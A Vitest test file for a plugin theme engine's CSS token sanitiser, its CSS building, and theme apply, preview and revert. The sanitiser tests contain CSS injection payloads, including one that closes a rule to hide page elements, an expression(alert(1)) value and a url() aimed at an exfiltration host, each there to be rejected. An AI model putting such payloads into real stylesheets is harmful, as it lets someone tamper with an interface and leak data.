/* @vitest-environment jsdom */

import { afterEach, describe, expect, it } from "vitest";

import {
  PLUGIN_THEME_CHANGED_EVENT,
  PLUGIN_THEME_MAX_TOKENS,
  PLUGIN_THEME_STYLE_ELEMENT_ID,
  appliedPluginTheme,
  applyPluginTheme,
  buildPluginThemeCss,
  currentPluginThemeCss,
  expandPluginThemeTokens,
  isPreviewingPluginTheme,
  previewPluginTheme,
  resetPluginThemeEngine,
  revertPluginThemePreview,
  sanitizePluginThemeTokens,
  type PluginThemeDefinition,
} from "./pluginTheme";

const MIDNIGHT: PluginThemeDefinition = {
  pluginId: "midnight",
  displayName: "Midnight",
  tokens: {
    dark: { "--color-accent": "#3B82F6", "--color-bg": "#05060A" },
    light: { "--color-accent": "#1D4ED8" },
  },
};

const SEPIA: PluginThemeDefinition = {
  pluginId: "sepia",
  displayName: "Sepia",
  tokens: { dark: { "--color-accent": "#D97706" } },
};

afterEach(() => {
  resetPluginThemeEngine();
});

describe("sanitizePluginThemeTokens", () => {
  it("keeps palette tokens and reports what it dropped", () => {
    const { tokens, rejected } = sanitizePluginThemeTokens({
      dark: {
        "--color-accent": "#3B82F6",
        "--gradient-hero": "linear-gradient(135deg, #3B82F6 0%, #1D4ED8 100%)",
        "--pr-surface": "color-mix(in srgb, var(--color-bg) 90%, #fff)",
        "--not-a-palette-token": "#fff",
      },
    });

    expect(Object.keys(tokens.dark ?? {})).toEqual([
      "--color-accent",
      "--gradient-hero",
      "--pr-surface",
    ]);
    expect(rejected).toEqual([
      { token: "dark.--not-a-palette-token", reason: "not an ADE palette token" },
    ]);
  });

  it("rejects a value that could close the rule and inject its own CSS", () => {
    const { tokens, rejected } = sanitizePluginThemeTokens({
      dark: { "--color-accent": "#fff } .ade-shell-sidebar-item { display: none " },
    });

    expect(tokens.dark).toBeUndefined();
    expect(rejected[0]?.reason).toBe("value is not a plain colour");
  });

  it("rejects values that fetch, execute, comment, or leave unbalanced parens", () => {
    const { rejected } = sanitizePluginThemeTokens({
      dark: {
        "--color-a": "url(https://example.com/x.png)",
        "--color-b": "expression(alert(1))",
        "--color-c": "#fff /* trailing",
        "--color-d": "color-mix(in srgb, #fff",
        "--color-e": "red; background: black",
      },
    });

    expect(rejected).toHaveLength(5);
    expect(rejected.every((entry) => entry.reason === "value is not a plain colour")).toBe(true);
  });

  it("rejects a token NAME that closes the rule, even under an allowed prefix", () => {
    const escape = "--color-x: red } html * { display: none } .z{a";
    const { tokens, rejected } = sanitizePluginThemeTokens({
      dark: {
        [escape]: "#fff",
        "--color-y: url(https://exfil.example.com/?c=": "#fff",
        "--color-UPPER": "#fff",
        "--color-ok": "#fff",
      },
    });

    expect(Object.keys(tokens.dark ?? {})).toEqual(["--color-ok"]);
    expect(rejected.map((entry) => entry.reason)).toEqual([
      "not an ADE palette token",
      "not an ADE palette token",
      "not an ADE palette token",
    ]);
    expect(buildPluginThemeCss(tokens)).not.toContain("display: none");
  });

  // The cap sits above ADE's whole palette vocabulary on purpose: an official
  // theme sets 114 tokens, and a cap under that would truncate a complete
  // theme rather than stop an abusive one.
  it("caps the number of tokens a single theme may set", () => {
    const dark: Record<string, string> = {};
    for (let index = 0; index < PLUGIN_THEME_MAX_TOKENS + 5; index += 1) {
      dark[`--color-token-${index}`] = "#ffffff";
    }
    const { tokens, rejected } = sanitizePluginThemeTokens({ dark });

    expect(PLUGIN_THEME_MAX_TOKENS).toBeGreaterThanOrEqual(114);
    expect(Object.keys(tokens.dark ?? {})).toHaveLength(PLUGIN_THEME_MAX_TOKENS);
    expect(rejected).toHaveLength(5);
  });

  it("survives a malformed tokens blob", () => {
    expect(sanitizePluginThemeTokens(null).tokens).toEqual({});
    expect(sanitizePluginThemeTokens({ dark: "nope" } as never).tokens).toEqual({});
  });
});

describe("buildPluginThemeCss", () => {
  it("scopes each base under a doubled attribute selector so order cannot decide the winner", () => {
    const css = buildPluginThemeCss({ dark: { "--color-accent": "#3B82F6" } });
    expect(css).toContain('[data-theme="dark"][data-theme] {');
    expect(css).toContain("  --chat-accent: var(--color-accent);");
    expect(css).toContain("  --pr-thread-card: var(--color-card);");
    expect(css).toContain("  --color-accent: #3B82F6;");
  });

  it("emits nothing for an empty token set", () => {
    expect(buildPluginThemeCss({})).toBe("");
  });
});

describe("expandPluginThemeTokens", () => {
  it("fills deep product roles while preserving explicit art direction", () => {
    const expanded = expandPluginThemeTokens({
      dark: {
        "--color-accent": "#3B82F6",
        "--chat-card-bg": "#101828",
      },
    });

    expect(expanded.dark?.["--chat-accent"]).toBe("var(--color-accent)");
    expect(expanded.dark?.["--shell-control-open-bg"]).toContain("var(--color-accent)");
    expect(expanded.dark?.["--pr-panel-card"]).toContain("var(--color-surface-raised)");
    expect(expanded.dark?.["--chat-card-bg"]).toBe("#101828");
  });

  /**
   * The rule the whole official set depends on. Derivation is a floor: a theme
   * that names a chrome token keeps its own value, whatever the engine would
   * have computed for it.
   */
  it("derives only the tokens the theme did not set", () => {
    const authored = {
      "--shell-sidebar-item-hover-bg": "#123456",
      "--shell-control-open-bg": "#654321",
      "--pane-border": "#abcdef",
    };
    const expanded = expandPluginThemeTokens({ dark: authored });

    for (const [name, value] of Object.entries(authored)) {
      expect(expanded.dark?.[name]).toBe(value);
    }
    // ...and still fills what was left unsaid.
    expect(expanded.dark?.["--shell-project-tab-hover-bg"]).toBeTruthy();
  });

  /**
   * Ninety roles used to be a `color-mix` of `--color-accent`, so any theme
   * that stopped at a palette came out as one hue on every hover, tab, control
   * and pane. Chrome now follows the surface ladder; the accent is left for the
   * roles that mean "accent".
   */
  it("derives shell chrome from the surface ladder rather than the accent", () => {
    const chrome = expandPluginThemeTokens({ dark: { "--color-accent": "#3B82F6" } }).dark ?? {};

    const surfaceLed = [
      "--shell-project-tab-hover-bg",
      "--shell-project-tab-active-bg",
      "--shell-project-tab-open-bg",
      "--shell-project-tab-focus-bg",
      "--shell-sidebar-item-hover-bg",
      "--shell-control-hover-bg",
      "--work-popover-item-hover",
      "--work-popover-item-active",
    ];
    for (const token of surfaceLed) {
      expect(chrome[token]).not.toContain("var(--color-accent)");
    }

    const accentLed = [
      "--shell-sidebar-item-active-rail",
      "--shell-project-tab-focus-ring",
      "--shell-control-focus-ring",
      "--shell-control-open-border",
    ];
    for (const token of accentLed) {
      expect(chrome[token]).toContain("var(--color-accent");
    }
  });
});

describe("apply / preview / revert", () => {
  it("injects exactly one stylesheet and replaces its contents in place", () => {
    applyPluginTheme(MIDNIGHT);
    applyPluginTheme(SEPIA);

    const elements = document.querySelectorAll(`#${PLUGIN_THEME_STYLE_ELEMENT_ID}`);
    expect(elements).toHaveLength(1);
    expect(currentPluginThemeCss()).toContain("#D97706");
    expect(currentPluginThemeCss()).not.toContain("#3B82F6");
    expect(appliedPluginTheme()?.pluginId).toBe("sepia");
  });

  it("removes the stylesheet when the built-in palette is restored", () => {
    applyPluginTheme(MIDNIGHT);
    applyPluginTheme(null);

    expect(document.getElementById(PLUGIN_THEME_STYLE_ELEMENT_ID)).toBeNull();
    expect(currentPluginThemeCss()).toBeNull();
    expect(appliedPluginTheme()).toBeNull();
  });

  it("reverts a preview to the applied theme without persisting the preview", () => {
    applyPluginTheme(MIDNIGHT);
    previewPluginTheme(SEPIA);

    expect(isPreviewingPluginTheme()).toBe(true);
    expect(currentPluginThemeCss()).toContain("#D97706");
    // Previewing never changes what a restart would restore.
    expect(appliedPluginTheme()?.pluginId).toBe("midnight");

    revertPluginThemePreview();
    expect(isPreviewingPluginTheme()).toBe(false);
    expect(currentPluginThemeCss()).toContain("#3B82F6");
  });

  it("reverts a preview started with no theme applied back to the built-ins", () => {
    previewPluginTheme(SEPIA);
    revertPluginThemePreview();

    expect(document.getElementById(PLUGIN_THEME_STYLE_ELEMENT_ID)).toBeNull();
  });

  it("stays silent when a repaint would not change anything", () => {
    const seen: (string | null)[] = [];
    const listener = (event: Event) => {
      seen.push((event as CustomEvent<{ pluginId: string | null }>).detail.pluginId);
    };
    window.addEventListener(PLUGIN_THEME_CHANGED_EVENT, listener);

    applyPluginTheme(MIDNIGHT);
    // The registry hands back a new array on every refresh; re-applying the
    // same theme must not tell every colour consumer to re-read.
    applyPluginTheme({ ...MIDNIGHT, tokens: { ...MIDNIGHT.tokens } });
    applyPluginTheme(null);
    applyPluginTheme(null);

    window.removeEventListener(PLUGIN_THEME_CHANGED_EVENT, listener);
    expect(seen).toEqual(["midnight", null]);
  });

  it("notifies the JavaScript-side colour consumers on every change", () => {
    const seen: (string | null)[] = [];
    const listener = (event: Event) => {
      seen.push((event as CustomEvent<{ pluginId: string | null }>).detail.pluginId);
    };
    window.addEventListener(PLUGIN_THEME_CHANGED_EVENT, listener);

    applyPluginTheme(MIDNIGHT);
    previewPluginTheme(SEPIA);
    revertPluginThemePreview();
    applyPluginTheme(null);

    window.removeEventListener(PLUGIN_THEME_CHANGED_EVENT, listener);
    expect(seen).toEqual(["midnight", "sepia", "midnight", null]);
  });

  it("drops unsafe tokens at paint time, not just at validation time", () => {
    applyPluginTheme({
      pluginId: "hostile",
      displayName: "Hostile",
      tokens: { dark: { "--color-accent": "#fff } body { display: none " } },
    });

    expect(document.getElementById(PLUGIN_THEME_STYLE_ELEMENT_ID)).toBeNull();
  });
});
